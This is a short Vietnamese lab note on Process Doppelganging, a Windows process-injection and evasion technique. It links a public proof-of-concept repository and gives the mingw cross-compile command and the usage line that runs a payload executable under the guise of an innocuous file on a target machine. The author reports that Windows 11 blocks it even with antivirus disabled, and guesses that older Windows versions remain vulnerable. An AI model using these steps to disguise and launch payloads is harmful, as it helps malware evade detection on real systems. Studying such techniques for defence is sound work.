## Tài liệu trình bày về một repo có sẵn về Process Doppelganging
- Repo: https://github.com/hasherezade/process_doppelganging
- Blog tương ứng: https://www.ired.team/offensive-security/code-injection-process-injection/process-doppelganging


Cách build trên linux sử dụng `mingw` 
- Sửa các tên thư viện trong các file thành chữ thường:
    - Windows.h -> windows.h
    - KtmW32.h -> ktmw32.h
- Chạy lệnh build sau: 
```
x86_64-w64-mingw32-g++ main.cpp util.cpp ntdll_undoc.cpp pe_hdrs_helper.cpp process_env.cpp \
    -o process_doppelganger.exe \
    -I/usr/x86_64-w64-mingw32/include \
    -D_WIN32_WINNT=0x0600 \
    -DWINVER=0x0600 \
    -lktmw32 \
    -lntdll \
    -luserenv \
    -static \
    -mconsole \
    -fpermissive \
    -Wno-write-strings
```

Kết quả có được file `process_doppelganger.exe`

Copy sang win target 

Khi đó ta thực hiện lệnh sau để chạy `payload.exe` dưới danh nghĩa là file `target_file.txt`
```bash 
.\process-doppelganger.exe <payload.exe> <target_file.txt>
```

Kết quả: 
- Chạy trên máy chính(win 11, đã tắt AV) -> xuất hiện error `kernel protection`: win phiên bản mới đã cập nhật để vá lỗi này 
- Các win cũ vẫn còn lỗi này(ví dụ win7) -> chưa thử nhưng mà hình như được 